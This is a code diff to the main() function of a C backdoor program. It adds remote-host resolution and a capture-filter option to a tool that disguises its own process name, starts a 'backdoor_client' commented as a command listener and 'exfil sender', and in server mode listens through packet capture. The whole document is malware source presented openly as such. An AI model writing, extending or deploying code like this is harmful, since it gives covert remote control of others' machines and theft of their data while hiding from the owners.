@@ -29,6 +29,7 @@ NOTES: See the program help for usage instructions and the attached
 #include "defs.h"
 #include "mask.h"
 #include "util.h"
+#include "inet.h"
 
 int main(int argc, char *argv[])
 {
@@ -37,12 +38,15 @@ int main(int argc, char *argv[])
 	int c;
 	int client = 0;
 	int duplex = 0;
-	char ipaddr[MAX_LEN];
+	char rmthost[MAX_LEN];
+	char filter[MAX_LEN];
 	int port = DEF_PRT;
+	uint32 ipaddr;
 	
-	strncpy(ipaddr, DEF_ADR, MAX_LEN);
+	strncpy(rmthost, DEF_ADR, MAX_LEN);
+	strncpy(filter, DEF_FLT, MAX_LEN);
 
-	while ((c = getopt(argc, argv, ":csdhi:p:")) != -1) 
+	while ((c = getopt(argc, argv, ":csdhi:p:f:")) != -1)
 	{
 		switch(c) 
 		{
@@ -56,7 +60,10 @@ int main(int argc, char *argv[])
 				duplex = 1;
 				break;
 			case 'i':
-				strncpy(ipaddr, optarg, MAX_LEN); 
+				strncpy(rmthost, optarg, MAX_LEN); 
+				break;
+			case 'f':
+				strncpy(filter, optarg, MAX_LEN);
 				break;
 			case 'p':
 				port = atoi(optarg);
@@ -78,14 +85,17 @@ int main(int argc, char *argv[])
 	// Mask the program
 	maskprog(argv[0]);
 
+	ipaddr = resolve(rmthost);
+
 	if (client)
+	{
+		// Start command listener
 		backdoor_client(ipaddr, port, duplex);
+		// Start exfil sender
+	}
 	else
 	{
-		if (optind == argc)
-			pcap_init(DEF_FLT);
-		else
-			pcap_init(argv[optind]);
+		pcap_init(filter);
 
 		srv_listen(duplex);
 	}
